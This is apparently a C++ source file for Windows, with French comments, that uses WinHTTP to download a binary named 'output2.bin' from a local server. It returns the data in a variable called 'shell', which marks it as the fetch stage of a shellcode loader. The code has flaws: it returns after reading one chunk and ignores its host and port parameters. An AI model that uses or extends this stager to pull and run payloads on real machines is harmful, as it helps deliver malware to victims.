#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include "utils.h"
#include <iostream>
#include "Http.h"

#pragma comment(lib, "winhttp.lib")

HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
BOOL bResults = FALSE;

LPSTR CheckData(HINTERNET hRequest) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = nullptr; // obliger d'initialiser sinon warning

    do {
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            std::cout << "Error " << GetLastError() << " in WinHttpQueryDataAvailable.\n";
            break;
        }

        pszOutBuffer = (char*)LocalAlloc(LPTR, dwSize + 1); // mémoire allouer ici
        if (!pszOutBuffer) {
            std::cout << "Out of memory\n";
            break;
        }

        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
            std::cout << "Error " << GetLastError() << " in WinHttpReadData.\n";
            LocalFree(pszOutBuffer);
            pszOutBuffer = nullptr; // obliger sinon peux retourner des mémoire pas valide 
        }

        return pszOutBuffer;

    } while (dwSize > 0);

    return nullptr;
}

LPSTR Data(const wchar_t host[], int port, const wchar_t path[]) {

    hSession = Open();
    // Créer la session demandée
    if (hSession)
        hConnect = Connect(hSession, L"127.0.0.1", 1234);

    // Se connecter à la session demandée
    if (hConnect)
        hRequest = OpenRequest(hConnect, L"serv/output2.bin");

    // Envoie la requête
    if (hRequest)
        bResults = SendRequest(hRequest);

    // Reçois la réponse
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Lance le "ChekData" pour voir si rien n'est étrange dans la donnée reçu
    LPSTR shell = CheckData(hRequest);

    // Fermé tout les "Handle" qui ont été utilisé
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    if (!bResults) std::cout << "Error " << GetLastError() << " has occurred.\n";


    return shell;
}

